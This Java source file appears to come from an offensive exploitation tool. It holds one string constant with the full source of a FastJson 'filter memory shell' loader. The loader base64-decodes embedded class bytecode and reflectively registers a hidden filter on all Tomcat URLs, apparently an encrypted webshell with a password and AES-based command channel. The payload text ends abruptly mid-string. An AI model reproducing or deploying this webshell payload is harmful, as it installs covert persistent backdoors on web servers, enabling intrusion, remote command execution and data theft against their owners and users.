package core.memshellstr;

public class ConstantTemplate {

    public static final String FastJsonFilterMemShell =
            "public class FastJsonFilterMemShell extends ClassLoader {\n" +
            "    static {\n" +
            "        try {\n" +
            "            new FastJsonFilterMemShell();\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public FastJsonFilterMemShell() throws Exception {\n" +
            "        super(Thread.currentThread().getContextClassLoader());\n" +
            "        String byteString = \"yv66vgAAADMBaQoAFwDSCQBhANMKAGEA1AoAYQDVCgBhANYKAGEA1wcA2AoA2QDaCgDZANsIANwKAFQA3QoAFADeCQBhAN8KABcA4AkA4QDiCgDjAOQIAOUIAOYIAOcHAOgKABQA6QoA6gDrBwDsCgDqAO0IAO4KAGEA7wgA8AoAFwDxCgAUAPIIAPMIAPQIAPUIAPYIAPcIAPgIAPkKABQA+ggAhQoAFAD7CgD8AOsKAPwA/QcA/gsAKgD/BwEACgAUAQEHAQIKAC4A0goALgEDCgAuAQQHAJgKAGEBBQoBBgEHBwEICgA1AQkKANkBCggBCwoAYQEMBwDACgDZAPIIAQ0KAF4BDggBDwcBEAgBEQgBEggBEwgBFAcBFQsARAEWCwBEARcIARgIARkKABQBGgkAYQEbCAEcCQEdAR4KAR0BHwgBIAgBIQgBIgoAFAEjCAEkCgBhASUHASYIAScHAMgKAQYA6wgBKAoAYQEpCAEqCAErBwClCAEsBwEtCAEuCAEvBwEwCgBhANIBABBTVEFOREFSRF9DT05URVhUAQASTGphdmEvbGFuZy9PYmplY3Q7AQAIUkVTUE9OU0UBAARwYXNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAB9MbWVtc2hlbGwvVG9tY2F0RmlsdGVyTWVtU2hlbGw7AQANU3RhY2tNYXBUYWJsZQcBMAcA2AEAA0lNRgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApmaWx0ZXJOYW1lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGZmlsdGVyAQAHQ29udGV4dAEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAORmlsdGVyRGVmQ2xhc3MBAA1GaWx0ZXJEZWZDb25zAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEACWZpbHRlckRlZgEADmZpbHRlck1hcENsYXNzAQANRmlsdGVyTWFwQ29ucwEADEZpbHRlck1hcE9iagEAHEFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnQ2xhc3MBABVBcHBsaWNhdGlvbkZpbHRlckNvbnMBABRBcHBsaWNhdGlvbmZpbHRlck9iagEAE2dldEFwcEZpbHRlckNvbmZpZ3MBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZmlsdGVyQ29uZmlncwEAD0xqYXZhL3V0aWwvTWFwOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsHASYHAS0HAOwHAOgHATEHATIHAQABABBnZXRNZXRob2RCeUNsYXNzAQBRKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEdmFyNgEAAmNzAQAKbWV0aG9kTmFtZQEACnBhcmFtZXRlcnMBABJbTGphdmEvbGFuZy9DbGFzczsBAAZtZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwcBMwEABmludm9rZQEASyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAAm8xAQABaQEAAUkBAAdjbGFzc2VzAQAVTGphdmEvdXRpbC9BcnJheUxpc3Q7AQAEdmFyNwEAA29iagEAE1tMamF2YS9sYW5nL09iamVjdDsHAQIBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNQEAIExqYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb247AQAEdmFyMAEABHZhcjEBAAR2YXIyAQAEdmFyMwcBCAEACkV4Y2VwdGlvbnMBABJnZXRTdGFuZGFyZENvbnRleHQBAAV2YXIxNwEABXZhcjExAQAFdmFyMTIBAAV2YXIxMwEABXZhcjE0AQAFdmFyMTUBAAV2YXIxNgEABHZhcjkBAAV2YXIxMAEABHZhcjgBABBMamF2YS91dGlsL0xpc3Q7AQAEdmFyNAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAAVoBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwE0BwEVAQATZ2V0U3RhbmRhcmRDb250ZXh0MQEAB3JlcXVlc3QBAA5zZXJ2bGV0Q29udGV4dAEADGludm9rZU1ldGhvZAEAA0lNQwEAAltCAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAZiYXNlNjQBAAJicwEABXZhbHVlAQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQAZVG9tY2F0RmlsdGVyTWVtU2hlbGwuamF2YQwAZwBoDABjAGQMALEAaAwAwwBoDADHAGgMAHEAaAEAE2phdmEvbGFuZy9FeGNlcHRpb24HATQMATUBNgwBNwE4AQAabWVtc2hlbGwuVG9tY2F0RmlsdGVyU2hlbGwMATkBOgwBOwE8DABmAGQMAT0BPgcBPwwBQAFBBwFCDAFDAUQBABtvcmcuYXBhY2hlLmNhdGFsaW5hLkNvbnRleHQBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJEZWYBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZgEAD2phdmEvbGFuZy9DbGFzcwwBRQFGBwExDAFHAUgBABBqYXZhL2xhbmcvT2JqZWN0DAE7AUkBAA1zZXRGaWx0ZXJOYW1lDACcAJ0BAA5zZXRGaWx0ZXJDbGFzcwwBSgFLDAFMAU0BAAxhZGRGaWx0ZXJEZWYBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXABAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlck1hcAEADWFkZFVSTFBhdHRlcm4BAAIvKgEADGFkZEZpbHRlck1hcAEAMG9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwwBTgFLDAFPAVAHATIMAVEBUgEADWphdmEvdXRpbC9NYXAMAVMBVAEAE2phdmEvbGFuZy9UaHJvd2FibGUMAVUBVgEAE2phdmEvdXRpbC9BcnJheUxpc3QMAVcBPgwBWAFZDACSAJMHATMMAJwBWgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgwAZwFbDAFcAV0BAAd0aHJlYWRzDACnAKgBAARodHRwDAFeAV8BAAZ0YXJnZXQBABJqYXZhL2xhbmcvUnVubmFibGUBAAZ0aGlzJDABAAdoYW5kbGVyAQAGZ2xvYmFsAQAKcHJvY2Vzc29ycwEADmphdmEvdXRpbC9MaXN0DAFgAWEMAVEBYgEAA3JlcQEAC2dldFJlc3BvbnNlDAFjAVYMAGUAZAEAB2dldE5vdGUHAWQMAWUAeAwBZgFnAQAHY29udGV4dAEAEWdldFNlcnZsZXRDb250ZXh0AQAtY29tLm9wZW5zeW1waG9ueS53ZWJ3b3JrLlNlcnZsZXRBY3Rpb25Db250ZXh0DAFoAToBAApnZXRSZXF1ZXN0DADGAJ0BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwEimHl2NjZ2Z0FBQURNQlRnY0FzUWtBUmdDeUJ3Q3pDZ0FEQUxRS0FBTUF0UWtBUmdDMkNnQURBTGNLQUVZQXVBa0FSZ0M1Q0FDNkNRQkdBTHNIQUx3SkFFWUF2UWtBUmdDK0NRQkdBTDhLQU1BQXdRb0FXd0MwQ0FEQ0NBRERDQURFQ2dCYkFNVUtBRnNBeGdnQXh3b0F5QURKQndES0NnQUJBTXNLQUJrQXpBb0F5QUROQ2dESUFNNEhBTThJQU5BS0FORUEwZ29BQVFEVENnRFJBTlFIQU5VS0FORUExZ29BSXdEWENnQWpBTmdLQUFFQTJRZ0EyZ29BTVFEYkNBRGNCd0RkQ2dBeEFONEhBTjhLQU9BQTRRb0FEQURpQ0FEakJ3RGtCd0I2Q0FEbENnQXhBT1lJQU9jSUFPZ0lBT2tJQU9vSUFPc0hBT3dIQU8wSUFPNExBRG9BN3dnQThBb0FBUUR4Q3dBNkFQSUxBRG9BOHdvQVJnRDBDZ0JHQVBVSUFQWUxBUGNBK0FjQStRb0FNUUQ2Q2dCR0FNVUtBRVlBK3dzQTl3RDhDQUQ5Q3dBNkFQd0hBUDRLQUUwQXRBb0FEQUQvQ3dBN0FRQUtBQUVCQVFvQkFnRURDZ0FNQUxjS0FFMEJCQW9BUmdFRkNnQUJBUVlJQVFjSUFRZ0xBUWtCQ2dvQUhnRUxCd0VNQndFTkFRQUhjbVZ4ZFdWemRBRUFKMHhxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjblpzWlhSU1pYRjFaWE4wT3dFQUNISmxjM0J2Ym5ObEFRQW9UR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnlkbXhsZEZKbGMzQnZibk5sT3dFQUFuaGpBUUFTVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRFVIZGtBUUFFY0dGMGFBRUFBMjFrTlFFQUFtTnpBUUFHWlhGMVlXeHpBUUFWS0V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3lsYUFRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFCeE1iV1Z0YzJobGJHd3ZWRzl0WTJGMFJtbHNkR1Z5VTJobGJHdzdBUUFCYndFQUVreHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFDR2hoYzJoRGIyUmxBUUFES0NsSkFRQUdQR2x1YVhRK0FRQURLQ2xXQVFBYUtFeHFZWFpoTDJ4aGJtY3ZRMnhoYzNOTWIyRmtaWEk3S1ZZQkFBRjZBUUFYVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQUZSQVFBVktGdENLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFDWTJJQkFBSmJRZ0VBQVhnQkFBY29XMEphS1Z0Q0FRQUJZd0VBRlV4cVlYWmhlQzlqY25sd2RHOHZRMmx3YUdWeU93RUFCSFpoY2pRQkFCVk1hbUYyWVM5c1lXNW5MMFY0WTJWd2RHbHZianNCQUFGekFRQUJiUUVBQVZvQkFBMVRkR0ZqYTAxaGNGUmhZbXhsQndENUJ3RU9Cd0RQQVFBbUtFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQjFNYW1GMllTOXpaV04xY21sMGVTOU5aWE56WVdkbFJHbG5aWE4wT3dFQUEzSmxkQWNBc1FFQURHSmhjMlUyTkVWdVkyOWtaUUVBRmloYlFpbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQWRGYm1OdlpHVnlBUUFHWW1GelpUWTBBUUFSVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjenNCQUFSMllYSTJBUUFDWW5NQkFBVjJZV3gxWlFFQUNrVjRZMlZ3ZEdsdmJuTUJBQXhpWVhObE5qUkVaV052WkdVQkFCWW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVnRDQVFBSFpHVmpiMlJsY2dFQUJHbHVhWFFCQUI4b1RHcGhkbUY0TDNObGNuWnNaWFF2Um1sc2RHVnlRMjl1Wm1sbk95bFdBUUFNWm1sc2RHVnlRMjl1Wm1sbkFRQWNUR3BoZG1GNEwzTmxjblpzWlhRdlJtbHNkR1Z5UTI5dVptbG5Pd2NCRHdFQUNHUnZSbWxzZEdWeUFRQmJLRXhxWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYRjFaWE4wTzB4cVlYWmhlQzl6WlhKMmJHVjBMMU5sY25ac1pYUlNaWE53YjI1elpUdE1hbUYyWVhndmMyVnlkbXhsZEM5R2FXeDBaWEpEYUdGcGJqc3BWZ0VBQm1GeWNrOTFkQUVBSDB4cVlYWmhMMmx2TDBKNWRHVkJjbkpoZVU5MWRIQjFkRk4wY21WaGJUc0JBQUZtQVFBSGMyVnpjMmx2YmdFQUlFeHFZWFpoZUM5elpYSjJiR1YwTDJoMGRIQXZTSFIwY0ZObGMzTnBiMjQ3QVFBRVpHRjBZUUVBQkhaaGNqa0JBQTV6WlhKMmJHVjBVbVZ4ZFdWemRBRUFIa3hxWVhaaGVDOXpaWEoyYkdWMEwxTmxjblpzWlhSU1pYRjFaWE4wT3dFQUQzTmxjblpzWlhSU1pYTndiMjV6WlFFQUgweHFZWFpoZUM5elpYSjJiR1YwTDFObGNuWnNaWFJTWlhOd2IyNXpaVHNCQUF0bWFXeDBaWEpEYUdGcGJnRUFHMHhxWVhaaGVDOXpaWEoyYkdWMEwwWnBiSFJsY2tOb1lXbHVPd2NCRUFjQkVRRUFCMlJsYzNSeWIza0JBQXBUYjNWeVkyVkdhV3hsQVFBV1ZHOXRZMkYwUm1sc2RHVnlVMmhsYkd3dWFtRjJZUUVBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNNQUdNQVlnRUFGMnBoZG1FdmJHRnVaeTlUZEhKcGJtZENkV2xzWkdWeURBQnlBSE1NQVJJQkV3d0FZUUJpREFFVUFSVU1BR1VBaUF3QVpRQmlBUUFGVlZSR0xUZ01BR1lBWWdFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRTUFGMEFYZ3dBWHdCZ0RBQmtBR0lIQVJZTUFSY0JHQUVBRUROak5tVXdZamhoT1dNeE5USXlOR0VCQUFSd1FWTXpBUUFRTDJaaGRtbGpiMjVrWlcxdkxtbGpid3dBY2dCMERBRVpBUm9CQUFOQlJWTUhBUTRNQVJzQkhBRUFIMnBoZG1GNEwyTnllWEIwYnk5emNHVmpMMU5sWTNKbGRFdGxlVk53WldNTUFSMEJIZ3dBY2dFZkRBQ1lBU0FNQVNFQklnRUFFMnBoZG1FdmJHRnVaeTlGZUdObGNIUnBiMjRCQUFOTlJEVUhBU01NQVJzQkpBd0JKUUJ4REFFbUFTY0JBQlJxWVhaaEwyMWhkR2d2UW1sblNXNTBaV2RsY2d3QktBRWVEQUJ5QVNrTUFSUUJLZ3dCS3dFVkFRQVFhbUYyWVM1MWRHbHNMa0poYzJVMk5Bd0JMQUV0QVFBS1oyVjBSVzVqYjJSbGNnRUFFbHRNYW1GMllTOXNZVzVuTDBOc1lYTnpPd3dCTGdFdkFRQVRXMHhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd2NCTUF3Qk1RRXlEQUV6QVRRQkFBNWxibU52WkdWVWIxTjBjbWx1WndFQUQycGhkbUV2YkdGdVp5OURiR0Z6Y3dFQUZuTjFiaTV0YVhOakxrSkJVMFUyTkVWdVkyOWtaWElNQVRVQk5nRUFCbVZ1WTI5a1pRRUFDbWRsZEVSbFkyOWtaWElCQUFaa1pXTnZaR1VCQUJaemRXNHViV2x6WXk1Q1FWTkZOalJFWldOdlpHVnlBUUFNWkdWamIyUmxRblZtWm1WeUFRQWxhbUYyWVhndmMyVnlkbXhsZEM5b2RIUndMMGgwZEhCVFpYSjJiR1YwVW1WeGRXVnpkQUVBSm1waGRtRjRMM05sY25ac1pYUXZhSFIwY0M5SWRIUndVMlZ5ZG14bGRGSmxjM0J2Ym5ObEFRQVFXQzFTWlhGMVpYTjBaV1F0VjJsMGFBd0JOd0NJQVFBT1dFMU1TRlJVVUZKbGNYVmxjM1FNQVRnQk9Rd0JPZ0U3REFFOEFJZ01BSlVBbGd3QWV3QjhBUUFRYldWdGMyaGxiR3d1Y0dGNWJHOWhaQWNCRUF3QlBRRStBUUFhYldWdGMyaGxiR3d2Vkc5dFkyRjBSbWxzZEdWeVUyaGxiR3dNQVQ4QlFBd0Fkd0I0REFGQkFVSUJBQXB3WVhKaGJXVjBaWEp6QVFBZGFtRjJZUzlwYnk5Q2VYUmxRWEp5WVhsUGRYUndkWFJUZEhKbFlXME1BR2NBYUF3QlF3RkVEQUZGQVVZSEFVY01BVWdCU1F3QlNnRWVEQUNNQUkwTUFVVUJLZ0VBRGxodGJFaFVWRkJTWlhGMVpYTjBBUUFIVTNWalkyVnpjd2NCU3d3QW5RRk1EQUZOQUhNQkFCVnFZWFpoTDJ4aGJtY3ZRMnhoYzNOTWIyRmtaWElCQUJScVlYWmhlQzl6WlhKMmJHVjBMMFpwYkhSbGNnRUFFMnBoZG1GNEwyTnllWEIwYnk5RGFYQm9aWElCQUI1cVlYWmhlQzl6WlhKMmJHVjBMMU5sY25ac1pYUkZlR05sY0hScGIyNEJBQjVxWVhaaGVDOXpaWEoyYkdWMEwyaDBkSEF2U0hSMGNGTmxjM05wYjI0QkFCTnFZWFpoTDJsdkwwbFBSWGhqWlhCMGFXOXVBUUFHWVhCd1pXNWtBUUF0S0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WjBKMWFXeGtaWEk3QVFBSWRHOVRkSEpwYm1jQkFCUW9LVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBRVdwaGRtRXZkWFJwYkM5UFltcGxZM1J6QVFBRWFHRnphQUVBRmloYlRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0tVa0JBQXRrWldacGJtVkRiR0Z6Y3dFQUZ5aGJRa2xKS1V4cVlYWmhMMnhoYm1jdlEyeGhjM003QVFBTFoyVjBTVzV6ZEdGdVkyVUJBQ2tvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhlQzlqY25sd2RHOHZRMmx3YUdWeU93RUFDR2RsZEVKNWRHVnpBUUFFS0NsYlFnRUFGeWhiUWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsV0FRQVhLRWxNYW1GMllTOXpaV04xY21sMGVTOUxaWGs3S1ZZQkFBZGtiMFpwYm1Gc0FRQUdLRnRDS1Z0Q0FRQWJhbUYyWVM5elpXTjFjbWwwZVM5TlpYTnpZV2RsUkdsblpYTjBBUUF4S0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzl6WldOMWNtbDBlUzlOWlhOellXZGxSR2xuWlhOME93RUFCbXhsYm1kMGFBRUFCblZ3WkdGMFpRRUFCeWhiUWtsSktWWUJBQVprYVdkbGMzUUJBQVlvU1Z0Q0tWWUJBQlVvU1NsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBdDBiMVZ3Y0dWeVEyRnpaUUVBQjJadmNrNWhiV1VCQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUpaMlYwVFdWMGFHOWtBUUJBS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzF0TWFtRjJZUzlzWVc1bkwwTnNZWE56T3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrT3dFQUdHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwMWxkR2h2WkFFQUJtbHVkbTlyWlFFQU9TaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREdGJUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQ0dkbGRFTnNZWE56QVFBVEtDbE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFDMjVsZDBsdWMzUmhibU5sQVFBVUtDbE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc0JBQWxuWlhSSVpXRmtaWElCQUFkcGJtUmxlRTltQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bEpBUUFLWjJWMFUyVnpjMmx2YmdFQUlpZ3BUR3BoZG1GNEwzTmxjblpzWlhRdmFIUjBjQzlJZEhSd1UyVnpjMmx2YmpzQkFBeG5aWFJRWVhKaGJXVjBaWElCQUF4blpYUkJkSFJ5YVdKMWRHVUJBQ1lvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3dFQURtZGxkRU5zWVhOelRHOWhaR1Z5QVFBWktDbE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3dFQURITmxkRUYwZEhKcFluVjBaUUVBSnloTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzcFZnRUFDV2RsZEZkeWFYUmxjZ0VBRnlncFRHcGhkbUV2YVc4dlVISnBiblJYY21sMFpYSTdBUUFKYzNWaWMzUnlhVzVuQVFBV0tFbEpLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBRTJwaGRtRXZhVzh2VUhKcGJuUlhjbWwwWlhJQkFBVjNjbWwwWlFFQUZTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BWZ0VBQzNSdlFubDBaVUZ5Y21GNUFRQVphbUYyWVhndmMyVnlkbXhsZEM5R2FXeDBaWEpEYUdGcGJnRUFRQ2hNYW1GMllYZ3ZjMlZ5ZG14bGRDOVRaWEoyYkdWMFVtVnhkV1Z6ZER0TWFtRjJZWGd2YzJWeWRteGxkQzlUWlhKMmJHVjBVbVZ6Y0c5dWMyVTdLVllCQUE5d2NtbHVkRk4wWVdOclZISmhZMlVBSVFCR0FGc0FBUUJjQUFjQUFRQmRBRjRBQUFBQkFGOEFZQUFBQUFBQVlRQmlBQUFBQVFCakFHSUFBQUFCQUdRQVlnQUFBQUFBWlFCaUFBQUFBUUJtQUdJQUFBQU1BQUVBWndCb0FBRUFhUUFBQUc4QUF3QUNBQUFBTHlvcndBQUJ0UUFDS3JzQUExbTNBQVFxdEFBQ3RnQUZLclFBQnJZQUJiWUFCN2dBQ0xVQUNTb1NDclVBQ3dTc0FBQUFBZ0JxQUFBQUVnQUVBQUFBR3dBSUFCd0FKd0FkQUMwQUhnQnJBQUFBRmdBQ0FBQUFMd0JzQUcwQUFBQUFBQzhBYmdCdkFBRUFBUUJ3QUhFQUFRQnBBQUFBWlFBRUFBRUFBQUE3RUFlOUFBeFpBeXEwQUExVFdRUXF0QUFPVTFrRktyUUFCbE5aQmlxMEFBSlRXUWNxdEFBUFUxa0lLclFBQ1ZOWkVBWXF0QUFMVTdnQUVLd0FBQUFDQUdvQUFBQUdBQUVBQUFBakFHc0FBQUFNQUFFQUFBQTdBR3dBYlFBQUFBRUFjZ0J6QUFFQWFRQUFBR01BQWdBQkFBQUFJU3EzQUJFcUFiVUFEU29CdFFBT0toSVN0UUFHS2hJVHRRQUNLaElVdFFBUHNRQUFBQUlBYWdBQUFCNEFCd0FBQUNZQUJBQVJBQWtBRWdBT0FCTUFGQUFVQUJvQUZRQWdBQ2NBYXdBQUFBd0FBUUFBQUNFQWJBQnRBQUFBQVFCeUFIUUFBUUJwQUFBQW13QURBQUlBQUFCSEtpdTNBQlVxQWJVQURTb0J0UUFPS2hJU3RRQUdLaElUdFFBQ0toSVV0UUFQS3JzQUExbTNBQVFxdEFBQ3RnQUZLclFBQnJZQUJiWUFCN2dBQ0xVQUNTb1NDclVBQzdFQUFBQUNBR29BQUFBbUFBa0FBQUFyQUFVQUVRQUtBQklBRHdBVEFCVUFGQUFiQUJVQUlRQXNBRUFBTFFCR0FDNEFhd0FBQUJZQUFnQUFBRWNBYkFCdEFBQUFBQUJIQUhVQWRnQUJBQUVBZHdCNEFBRUFhUUFBQUQwQUJBQUNBQUFBQ1NvckF5dSt0d0FXc0FBQUFBSUFhZ0FBQUFZQUFRQUFBREVBYXdBQUFCWUFBZ0FBQUFrQWJBQnRBQUFBQUFBSkFIa0FlZ0FCQUFFQWV3QjhBQUVBYVFBQUFOZ0FCZ0FFQUFBQUxCSVh1QUFZVGkwY21RQUhCS2NBQkFXN0FCbFpLclFBQnJZQUdoSVh0d0FidGdBY0xTdTJBQjJ3VGdHd0FBRUFBQUFvQUNrQUhnQURBR29BQUFBV0FBVUFBQUEyQUFZQU53QWpBRGdBS1FBNUFDb0FPZ0JyQUFBQU5BQUZBQVlBSXdCOUFINEFBd0FxQUFJQWZ3Q0FBQU1BQUFBc0FHd0FiUUFBQUFBQUxBQ0JBSG9BQVFBQUFDd0FnZ0NEQUFJQWhBQUFBRHdBQS84QUR3QUVCd0NGQndBeUFRY0FoZ0FCQndDRy93QUFBQVFIQUlVSEFESUJCd0NHQUFJSEFJWUIvd0FZQUFNSEFJVUhBRElCQUFFSEFJY0FDUUJsQUlnQUFRQnBBQUFBcHdBRUFBTUFBQUF3QVV3U0g3Z0FJRTBzS3JZQUdnTXF0Z0FodGdBaXV3QWpXUVFzdGdBa3R3QWxFQkMyQUNhMkFDZE1wd0FFVFN1d0FBRUFBZ0FxQUMwQUhnQURBR29BQUFBZUFBY0FBQUEvQUFJQVFnQUlBRU1BRlFCRUFDb0FSZ0F0QUVVQUxnQklBR3NBQUFBZ0FBTUFDQUFpQUlJQWlRQUNBQUFBTUFDQkFHSUFBQUFDQUM0QWlnQmlBQUVBaEFBQUFCTUFBdjhBTFFBQ0J3Q0xCd0NMQUFFSEFJY0FBQWtBakFDTkFBSUFhUUFBQVVrQUJnQUZBQUFBZUFGTUVpaTRBQ2xOTEJJcUFjQUFLN1lBTEN3QndBQXR0Z0F1VGkyMkFDOFNNQVM5QURGWkF4SXlVN1lBTEMwRXZRQU1XUU1xVTdZQUxzQUFBVXluQURsT0VqTzRBQ2xOTExZQU5Eb0VHUVMyQUM4U05RUzlBREZaQXhJeVU3WUFMQmtFQkwwQURGa0RLbE8yQUM3QUFBRk1wd0FGT2dRcnNBQUNBQUlBUFFCQUFCNEFRUUJ4QUhRQUhnQURBR29BQUFBeUFBd0FBQUJNQUFJQVVBQUlBRkVBR3dCU0FEMEFXZ0JBQUZNQVFRQlZBRWNBVmdCTkFGY0FjUUJaQUhRQVdBQjJBRndBYXdBQUFFZ0FCd0FiQUNJQWpnQnZBQU1BQ0FBNEFJOEFrQUFDQUUwQUpBQ09BRzhBQkFCSEFDMEFqd0NRQUFJQVFRQTFBSkVBZ0FBREFBQUFlQUNTQUhvQUFBQUNBSFlBa3dCaUFBRUFoQUFBQUNrQUEvOEFRQUFDQndBeUJ3Q0xBQUVIQUlmL0FETUFCQWNBTWdjQWl3QUhBSWNBQVFjQWgva0FBUUNVQUFBQUJBQUJBQjRBQ1FDVkFKWUFBZ0JwQUFBQlZRQUdBQVVBQUFDRUFVd1NLTGdBS1Uwc0VqWUJ3QUFydGdBc0xBSEFBQzIyQUM1T0xiWUFMeEkzQkwwQU1Wa0RFZ0ZUdGdBc0xRUzlBQXhaQXlwVHRnQXV3QUF5d0FBeXdBQXlUS2NBUDA0U09MZ0FLVTBzdGdBME9nUVpCTFlBTHhJNUJMMEFNVmtERWdGVHRnQXNHUVFFdlFBTVdRTXFVN1lBTHNBQU1zQUFNc0FBTWt5bkFBVTZCQ3V3QUFJQUFnQkRBRVlBSGdCSEFIMEFnQUFlQUFNQWFnQUFBRElBREFBQUFHQUFBZ0JrQUFnQVpRQWJBR1lBUXdCdUFFWUFad0JIQUdrQVRRQnFBRk1BYXdCOUFHMEFnQUJzQUlJQWNBQnJBQUFBU0FBSEFCc0FLQUNYQUc4QUF3QUlBRDRBandDUUFBSUFVd0FxQUpjQWJ3QUVBRTBBTXdDUEFKQUFBZ0JIQURzQWtRQ0FBQU1BQUFDRUFKSUFZZ0FBQUFJQWdnQ1RBSG9BQVFDRUFBQUFLUUFEL3dCR0FBSUhBSXNIQURJQUFRY0FoLzhBT1FBRUJ3Q0xCd0F5QUFjQWh3QUJCd0NIK1FBQkFKUUFBQUFFQUFFQUhnQUJBSmdBbVFBQ0FHa0FBQUExQUFBQUFnQUFBQUd4QUFBQUFnQnFBQUFBQmdBQkFBQUFkZ0JyQUFBQUZnQUNBQUFBQVFCc0FHMEFBQUFBQUFFQW1nQ2JBQUVBbEFBQUFBUUFBUUNjQUFFQW5RQ2VBQUlBYVFBQUFsa